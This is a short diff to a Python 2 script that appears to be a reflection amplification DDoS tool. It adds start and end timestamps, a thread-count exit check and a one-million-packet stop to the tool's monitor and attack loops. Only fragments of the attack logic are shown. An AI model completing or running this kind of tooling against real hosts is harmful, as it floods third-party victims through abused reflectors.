@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 import sys
 import time
+from datetime import datetime
 import socket
 import struct
 import threading
@@ -130,6 +131,9 @@ def Monitor():
 			out = FMT.format(Calc(npackets, 1000), 
 				Calc(nbytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
 			sys.stderr.write('\r{}{}'.format(out, ' '*(60-len(out))))
+			list = threading.enumerate()
+			if len(list) == 1:
+				break
 			time.sleep(1)
 		except KeyboardInterrupt:
 			print '\nInterrupted'
@@ -176,6 +180,7 @@ class DDoS(object):
 		self.event = event
 		self.domains = domains
 	def stress(self):
+ 		print("Begin at " + str(datetime.now()))
 		for i in range(self.threads):
 			t = threading.Thread(target=self.__attack)
 			t.start()
@@ -247,6 +252,10 @@ class DDoS(object):
 						if not amplification[proto].has_key(soldier):
 							amplification[proto][soldier] = {}
 						for domain in self.domains:
+							if npackets > 1000000:
+								sys.stderr.write('\r\n')
+								print("End at " + str(datetime.now()))
+								sys.exit(1)
 							if not amplification[proto][soldier].has_key(domain):
 								size, _ = self.GetAmpSize(proto, soldier, domain)
 								if size==0:
